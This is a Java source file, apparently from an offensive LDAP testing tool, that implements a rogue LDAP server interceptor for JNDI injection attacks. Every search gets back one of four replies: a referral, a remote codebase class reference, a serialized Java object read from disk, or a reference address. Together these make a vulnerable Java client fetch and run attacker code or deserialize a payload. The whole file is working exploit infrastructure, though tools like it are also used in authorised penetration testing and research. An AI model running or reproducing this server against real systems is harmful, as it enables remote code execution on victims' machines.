package gs.sy.m8.ldapswak;

import java.io.IOException;
import java.net.MalformedURLException;
import java.nio.file.Files;
import java.util.Arrays;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Control;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import com.unboundid.ldap.sdk.SearchResultReference;

public class JNDIOperationInterceptor extends InMemoryOperationInterceptor {

	private static final Logger log = LoggerFactory.getLogger(JNDIOperationInterceptor.class);

	private final JNDIServer jndiServer;

	public JNDIOperationInterceptor(JNDIServer jndiServer) {
		this.jndiServer = jndiServer;
	}

	/**
	 * {@inheritDoc}
	 *
	 * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
	 */
	@Override
	public void processSearchResult(InMemoryInterceptedSearchResult result) {
		String base = result.getRequest().getBaseDN();
		Entry e = new Entry(base);
		try {
			if (this.jndiServer.referral != null) {
				sendReferral(result, base, e);
			} else if (this.jndiServer.refCodebase != null) {
				sendCodebaseResult(result, base, e);
			} else if (this.jndiServer.serialized != null) {
				sendSerializedResult(result, base, e);
			} else if (this.jndiServer.refAddress != null && this.jndiServer.refAddress.length > 0) {
				sendReferenceResult(result, base, e);
			} else {
				super.processSearchResult(result);
			}
		} catch (Exception e1) {
			e1.printStackTrace();
		}

	}

	private void sendReferral(InMemoryInterceptedSearchResult result, String base, Entry e)
			throws LDAPException, MalformedURLException {
		String ref = this.jndiServer.referral;
		log.info("Sending referral to {}", ref);
		result.sendSearchReference(new SearchResultReference(new String[] { ref }, new Control[] {}));
		result.setResult(new LDAPResult(0, ResultCode.REFERRAL));
	}

	private void sendCodebaseResult(InMemoryInterceptedSearchResult result, String base, Entry e)
			throws LDAPException, MalformedURLException {
		String codebase = this.jndiServer.refCodebase.toString();
		// trailing slash is necessary
		if ( codebase.charAt(codebase.length() - 1 ) != '/') {
			codebase += '/';
		}
		log.info("Sending remote ObjectFactory Reference classpath {} class {}", codebase,
				this.jndiServer.refClass);
		e.addAttribute("javaCodeBase", codebase);
		e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
		e.addAttribute("javaFactory", this.jndiServer.refClass);
		e.addAttribute("javaClassName", "java.util.HashMap");
		result.sendSearchEntry(e);
		result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
	}

	private void sendSerializedResult(InMemoryInterceptedSearchResult result, String base, Entry e)
			throws LDAPException, MalformedURLException {
		log.info("Sending serialized object");
		byte[] data;
		try {
			data = Files.readAllBytes(this.jndiServer.serialized);
		} catch (IOException e1) {
			log.error("Failed to read serialized data at " + this.jndiServer.serialized, e1);
			return;
		}
		e.addAttribute("objectClass", "javaSerializedData"); //$NON-NLS-1$
		e.addAttribute("javaSerializedData", data);
		e.addAttribute("javaClassName", "java.util.HashMap");
		result.sendSearchEntry(e);
		result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
	}

	private void sendReferenceResult(InMemoryInterceptedSearchResult result, String base, Entry e)
			throws LDAPException {
		log.info("Sending reference {}", Arrays.toString(this.jndiServer.refAddress));
		e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
		e.addAttribute("javaReferenceAddress", this.jndiServer.refAddress);
		if ( this.jndiServer.refFactory != null) {
			e.addAttribute("javaFactory", this.jndiServer.refFactory);
		}
		e.addAttribute("javaClassName", "java.util.HashMap");
		result.sendSearchEntry(e);
		result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
	}
}

